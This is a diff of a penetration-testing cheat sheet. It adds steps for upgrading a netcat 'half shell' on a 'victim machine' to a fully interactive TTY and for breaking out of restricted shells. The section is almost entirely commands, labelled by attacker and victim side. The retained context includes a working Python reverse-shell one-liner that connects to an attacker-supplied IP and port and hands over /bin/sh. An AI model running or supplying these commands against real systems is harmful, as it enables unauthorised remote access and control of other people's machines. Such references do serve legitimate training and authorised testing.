@@ -1,9 +1,31 @@
-== Spawning a TTY Shell - Break out of Jail or limited shell ==
+      == Upgrading half shells to fully interactive TTYs without closing nc session. ==
+
+-----
+python -c 'import pty; pty.spawn("/bin/bash")'
+-----
+background remote shell with Ctrl+Z    // on victim machine
+-----
+stty -a | grep rows    //on attacking machine
+speed 38400 baud; rows 55; columns 205; line = 0;
+-----
+echo $TERM     // on attacking machine
+-----
+sty raw echo   // attacking machine
+-----
+fg             // attacking machine
+-----
+reset          // attacking machine
+-----
+export TERM=xterm-256color //on victim machine
+export SHELL=BASH          //on victim machine
+stty rows 38 columns 116   //on victim machine
+-----
+
+            == Spawning a TTY Shell - Break out of Jail or limited shell ==
 
 *PYTHON*
 -----
 python -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=linux
 PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$ 
 -----
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
